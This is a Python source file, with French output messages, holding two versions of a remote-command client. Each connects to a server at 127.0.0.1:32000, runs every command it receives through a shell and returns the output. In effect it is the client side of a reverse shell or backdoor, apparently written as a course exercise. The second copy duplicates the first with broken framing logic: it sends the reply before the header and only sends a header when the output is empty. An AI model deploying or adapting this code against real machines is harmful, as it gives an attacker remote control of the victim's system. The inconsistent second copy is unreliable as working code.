import socket
import time
import subprocess
import os

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode().strip()
    print("Commande : ", commande)

    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
            reponse = f"Répertoire changé : {os.getcwd()}\n"
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas\n"
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True,
            universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr

    if not reponse:
        reponse = "Aucune sortie pour cette commande\n"

    # Header TOUJOURS envoyé avant la réponse
    reponse_encodee = reponse.encode()
    header = str(len(reponse_encodee)).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    s.sendall(reponse_encodee)

s.close()








import socket
import time
import subprocess

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)
    resultat = subprocess.run(commande, shell=True, capture_output=True, 
        universal_newlines=True)  # dir sur PCl
    reponse = resultat.stdout + resultat.stderr
    s.sendall(reponse.encode())
    
    if not reponse or len(reponse) == 0:
        reponse = "Aucune sortie pour cette commande"

        header = str(len(reponse)).zfill(13)  # header de 13 caractères pour la longueur de la réponse
        print("header: ", header)
        s.sendall(header.encode())
        s.sendall(reponse.encode()) 

s.close()

